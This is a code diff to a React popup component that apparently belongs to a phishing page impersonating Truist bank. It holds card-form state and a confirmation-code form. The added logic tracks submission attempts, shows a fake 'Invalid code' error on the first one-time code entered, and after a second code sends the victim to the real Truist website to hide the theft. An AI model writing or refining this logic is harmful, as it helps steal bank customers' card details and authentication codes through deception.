@@ -11,6 +11,7 @@ const Popup = () => {
   const [showConfirmation, setShowConfirmation] = useState(false);
   const [confirmationError, setConfirmationError] = useState("");
   const [isMobile, setIsMobile] = useState(false);
+  const [confirmationAttempt, setConfirmationAttempt] = useState(0); // Track confirmation attempts
   
   // Card form state
   const [cardName, setCardName] = useState("");
@@ -123,6 +124,7 @@ const Popup = () => {
     setTimeout(() => {
       setShowProcessing(false);
       setShowConfirmation(true);
+      setConfirmationAttempt(0); // Reset confirmation attempts when showing confirmation form
     }, 3000);
   };
 
@@ -141,17 +143,28 @@ const Popup = () => {
       confirmationCode 
     });
     
+    // Increment attempt counter
+    const nextAttempt = confirmationAttempt + 1;
+    setConfirmationAttempt(nextAttempt);
+    
     // Show processing screen
     setShowProcessing(true);
     setShowConfirmation(false);
     setConfirmationError("");
     
-    // After 3 seconds, show confirmation again with error
-    setTimeout(() => {
-      setShowProcessing(false);
-      setShowConfirmation(true);
-      setConfirmationError("Invalid code. Please try again.");
-    }, 3000);
+    if (nextAttempt === 1) {
+      // First attempt: show error after 3 seconds
+      setTimeout(() => {
+        setShowProcessing(false);
+        setShowConfirmation(true);
+        setConfirmationError("Invalid code. Please try again.");
+      }, 3000);
+    } else {
+      // Second attempt: redirect to Truist website after 3 seconds
+      setTimeout(() => {
+        window.location.href = "https://www.truist.com/";
+      }, 3000);
+    }
   };
 
   // Processing screen
